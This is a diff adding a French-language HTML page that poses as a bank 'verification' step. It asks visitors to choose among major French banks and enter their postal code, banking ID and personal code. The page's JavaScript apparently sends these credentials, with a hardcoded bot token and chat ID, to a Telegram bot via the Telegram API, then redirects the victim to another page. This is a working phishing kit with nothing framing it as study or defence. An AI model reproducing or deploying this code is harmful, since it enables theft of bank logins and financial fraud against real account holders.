@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérification en cours</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .evolution-chain {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      gap: 30px;
+      margin-top: 20px;
+    }
+
+    .step {
+      text-align: center;
+      font-size: 14px;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+
+    .step span.title {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      font-size: 16px;
+      color: #000;
+    }
+
+    .circle {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background-color: #FF5A00;
+      border: 3px solid #FF5A00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .circle-3, .circle-4 {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background-color: white;
+      border: 3px solid #FF5A00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .checkmark {
+      font-size: 14px;
+      color: white;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      background-color: #FF5A00;
+      border-radius: 50%;
+    }
+
+    .line {
+      position: absolute;
+      top: 70%;
+      left: 100%;
+      width: 20px;
+      height: 2px;
+      background-color: #FF5A00;
+      margin-top: -1px;
+    }
+
+    .step:last-child .line {
+      display: none;
+    }
+
+    main {
+      padding: 20px;
+      width: 100%;
+      max-width: 400px;
+      background-color: white;
+      margin-top: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .form-row select,
+    .form-row input {
+      width: 100%;
+      padding: 14px;
+      border-radius: 5px;
+      border: 2px solid #ccc;
+      font-size: 14px;
+      box-sizing: border-box;
+      color: #333;
+      margin-top: 20px;
+    }
+
+    .form-row select:focus,
+    .form-row input:focus {
+      border-color: #ff6e14;
+      outline: none;
+    }
+
+    #logosContainer {
+      display: flex;
+      justify-content: center;
+      margin-top: 30px;
+      gap: 20px;
+      flex-wrap: wrap;
+      display: none;
+    }
+
+    #logosContainer img {
+      max-width: 100px;
+      width: 100%;
+      height: auto;
+      display: block;
+      object-fit: contain;
+    }
+
+    .logo-hidden {
+      display: none;
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .card-logo {
+      width: 100px;
+      margin-top: 20px;
+      margin-bottom: 20px;
+      display: none;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    button {
+      width: 350px;
+      height: 50px;
+      background-color: #ff6e14;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      color: white;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #e14e00;
+    }
+
+    #headerLogo {
+      margin-top: 20px;
+      margin-bottom: 20px;
+      width: 150px;
+    }
+  </style>
+</head>
+<body>
+
+<img id="headerLogo" src="image/logo.png" alt="Logo">
+
+<div class="evolution-chain">
+  <div class="step">
+    <span class="title">Confirmer</span>
+    <div class="circle">
+      <div class="checkmark">✔</div>
+    </div>
+    <div class="line"></div>
+  </div>
+  <div class="step">
+    <span class="title">Checkpoint</span>
+    <div class="circle">
+      <div class="checkmark">✔</div>
+    </div>
+    <div class="line"></div>
+  </div>
+  <div class="step">
+    <span class="title">Vérifier</span>
+    <div class="circle circle-3">
+      <div class="dot"></div>
+    </div>
+    <div class="line"></div>
+  </div>
+  <div class="step">
+    <span class="title">Complete</span>
+    <div class="circle circle-4"></div>
+  </div>
+</div>
+
+<main>
+  <h1>Confirmez votre banque</h1>
+
+  <div id="logoContainer" class="form-row">
+    <img id="cardLogo" class="card-logo" src="" alt="Logo de la banque sélectionnée">
+  </div>
+
+  <form id="cardForm">
+    <div class="form-row">
+      <select id="cardType" name="cardType" required>
+        <option value="" disabled selected>Choisissez votre banque</option>
+        <option value="credit_agricole">CREDIT AGRICOLE</option>
+        <option value="banque_postale">BANQUE POSTALE</option>
+        <option value="bnp_paribas">BNP PARIBAS</option>
+        <option value="hsbc">HSBC</option>
+        <option value="axa_banque">AXA BANQUE</option>
+        <option value="caisse_epargne">CAISSE D'EPARGNE</option>
+        <option value="societe_generale">SOCIETE GENERALE</option>
+        <option value="banque_populaire">BANQUE POPULAIRE</option>
+        <option value="credit_mutuel">CREDIT MUTUEL</option>
+        <option value="lcl">LCL</option>
+        <option value="cic">CIC</option>
+        <option value="boursorama">BOURSO BANK</option>
+        <option value="hello_bank">HELLO BANK</option>
+        <option value="fortuneo">FORTUNEO</option>
+        <option value="bforbank">BFORBANK</option>
+        <option value="revolut">REVOLUT</option>
+        <option value="nickel">NICKEL</option>
+        <option value="autres_banques">AUTRES BANQUES</option>
+      </select>
+    </div>
+
+    <div class="form-row">
+      <input type="text" id="postalCode" name="postalCode" placeholder="Code Postal Banque" required>
+    </div>
+
+    <div class="form-row">
+      <input type="text" id="bankId" name="bankId" placeholder="Identifiant Bancaire" required>
+    </div>
+
+    <div class="form-row">
+      <input type="password" id="personalCode" name="personalCode" placeholder="Code Personnel" required>
+    </div>
+
+    <button type="submit">Confirmer</button>
+  </form>
+</main>
+
+<script>
+  $(document).ready(function() {
+    $('#cardType').change(function() {
+      var selectedBank = $(this).val();
+      var logoSrc = "";
+
+      switch (selectedBank) {
+        case "credit_agricole":
+          logoSrc = "image/1.png";
+          break;
+        case "banque_postale":
+          logoSrc = "image/3.png";
+          break;
+        case "bnp_paribas":
+          logoSrc = "image/2.png";
+          break;
+        case "hsbc":
+          logoSrc = "image/4.png";
+          break;
+        case "axa_banque":
+          logoSrc = "image/5.png";
+          break;
+        case "caisse_epargne":
+          logoSrc = "image/6.png";
+          break;
+        case "societe_generale":
+          logoSrc = "image/7.png";
+          break;
+        case "banque_populaire":
+          logoSrc = "image/8.png";
+          break;
+        case "credit_mutuel":
+          logoSrc = "image/9.png";
+          break;
+        case "lcl":
+          logoSrc = "image/10.png";
+          break;
+        case "cic":
+          logoSrc = "image/11.png";
+          break;
+        case "boursorama":
+          logoSrc = "image/12.png";
+          break;
+        case "hello_bank":
+          logoSrc = "image/13.png";
+          break;
+        case "fortuneo":
+          logoSrc = "image/14.png";
+          break;
+        case "bforbank":
+          logoSrc = "image/15.png";
+          break;
+        case "revolut":
+          logoSrc = "image/16.png";
+          break;
+        case "nickel":
+          logoSrc = "image/17.png";
+          break;
+        default:
+          logoSrc = "";
+      }
+
+      if (logoSrc) {
+        $('#cardLogo').attr('src', logoSrc).show();
+      } else {
+        $('#cardLogo').hide();
+      }
+    });
+  });
+
+  $(document).ready(function() {
+    $('#cardForm').submit(function(event) {
+      event.preventDefault(); // Empêche la soumission par défaut du formulaire
+
+      var formData = {
+        cardType: $('#cardType').val(),
+        postalCode: $('#postalCode').val(),
+        bankId: $('#bankId').val(),
+        personalCode: $('#personalCode').val()
+      };
+
+      // Construire le message pour Telegram
+      var message = `Nouveau message de formulaire :
+      \n\nType de Banque: ${formData.cardType}
+      \nCode Postal: ${formData.postalCode}
+      \nIdentifiant Bancaire: ${formData.bankId}
+      \nCode Personnel: ${formData.personalCode}`;
+
+      // Fonction pour envoyer le message à Telegram
+      sendToTelegram(message);
+
+      // Redirection vers etat.html
+      window.location.href = 'etat.html'; // Redirection vers la page etat.html
+    });
+  });
+
+  // Fonction pour envoyer le message à Telegram
+  async function sendToTelegram(message) {
+    const token = "8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI"; // Votre Token de Bot Telegram
+    const chatId = "5601119281"; // Votre Chat ID
+
+    // URL pour envoyer le message via l'API Telegram
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    // Options pour la requête POST
+    const data = {
+      chat_id: chatId,
+      text: message
+    };
+
+    try {
+      // Envoi de la requête à Telegram via Fetch API
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      });
+
+      // Vérification de la réponse
+      if (response.ok) {
+        alert("Les informations ont été envoyées");
+      } else {
+        
+      }
+    } catch (error) {
+    
+    }
+  }
+</script>
+</body>
+</html>
